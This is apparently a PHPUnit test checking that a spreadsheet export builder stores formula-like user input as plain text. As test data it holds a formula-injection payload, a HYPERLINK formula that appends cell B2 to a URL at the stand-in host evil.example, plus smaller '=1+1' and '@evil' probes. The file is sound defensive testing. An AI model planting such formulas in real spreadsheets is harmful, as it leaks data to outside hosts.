<?php

declare(strict_types=1);

namespace Tests\Unit\Services;

use App\Models\Anmeldung;
use App\Services\ExportService;
use App\Services\SpreadsheetBuilder;
use DateTimeImmutable;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PHPUnit\Framework\TestCase;

class SpreadsheetBuilderTest extends TestCase
{
    public function testFormulaLikeInputIsWrittenAsTextNotAsFormula(): void
    {
        $payload = '=HYPERLINK("https://evil.example/?d="&B2,"Öffnen")';

        $export = $this->createMock(ExportService::class);
        $export->method('getEffectiveData')->willReturn(['bemerkung' => $payload]);
        $export->method('formatCellValue')->willReturnArgument(0);
        $export->method('hasSchoolLookup')->willReturn(false);

        $anmeldung = new Anmeldung(
            1, 'form', '1.0', '=1+1', '@evil', 'neu', ['bemerkung' => $payload],
            new DateTimeImmutable('2026-01-01'), null, false, null
        );

        $spreadsheet = (new SpreadsheetBuilder($export))->build(
            [$anmeldung],
            ['bemerkung'],
            ['exportDate' => new DateTimeImmutable(), 'filter' => 'form', 'totalRows' => 1]
        );
        $sheet = $spreadsheet->getSheetByName('Anmeldungen');

        $found = false;
        foreach ($sheet->getRowIterator(2, 2) as $row) {
            foreach ($row->getCellIterator() as $cell) {
                if ($cell->getValue() === $payload) {
                    $found = true;
                    $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
                }
                if ($cell->getValue() === '=1+1') {
                    $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
                }
            }
        }
        $this->assertTrue($found, 'Payload-Zelle nicht gefunden');
    }
}
